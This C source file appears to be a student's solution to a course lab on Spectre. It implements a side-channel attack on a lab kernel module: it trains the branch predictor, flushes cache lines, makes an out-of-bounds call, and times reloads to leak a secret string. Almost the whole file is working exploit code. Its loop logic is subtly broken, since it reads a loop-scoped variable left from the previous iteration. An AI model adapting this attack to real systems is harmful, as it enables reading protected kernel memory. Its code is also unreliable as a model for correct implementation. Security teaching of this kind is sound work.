/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * reload_and_time
 * Measures access time to find the secret byte
 *
 * Arguments:
 *  - shared_memory: A pointer to the shared memory region
 * Returns:
 *  - The value of the secret byte determined by cache timing
 */
static short reload_and_time(char *shared_memory, int i) {
    short leaked_value = 1000;
    void *probe_addr = &shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
    uint64_t access_time = time_access(probe_addr);
    if (access_time < 100) {
        leaked_value = (char)i;
    }
    //if(leaked_value!= 1000)printf("%c %d\n", leaked_value, leaked_value);
    return leaked_value;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;
    char old_leaked_byte = -1;
    char oldest_leaked_byte = -1;
    bool chosen = false;
    printf("Launching attacker\n");
    srand(time(NULL));
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        short leaked_byte;
        // Train the branch predictor
        for (int i = 0; i < 100; i++) {
            call_kernel_part2(kernel_fd, shared_memory, 0); 
        }

        // Flush the shared memory from the cache
        int i = rand()%256;
        if(chosen) i = leaked_byte;
        void *flush_addr = &shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
        clflush(flush_addr);

        // Call victim with out-of-bounds offset
        size_t malicious_offset = current_offset; 
        call_kernel_part2(kernel_fd, shared_memory, malicious_offset);

        // Reload and time to find the leaked byte
        leaked_byte = reload_and_time(shared_memory, i);
        if(leaked_byte== 1000){current_offset--; chosen = false; continue;} else chosen = true;
        leaked_str[current_offset] = leaked_byte;
        if(leaked_byte != old_leaked_byte || leaked_byte != oldest_leaked_byte) {current_offset--;oldest_leaked_byte = old_leaked_byte;
old_leaked_byte = leaked_byte;
}

        else {old_leaked_byte = -1;
oldest_leaked_byte = -1;
if (leaked_byte == '\x00') {
            break;
        }}
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
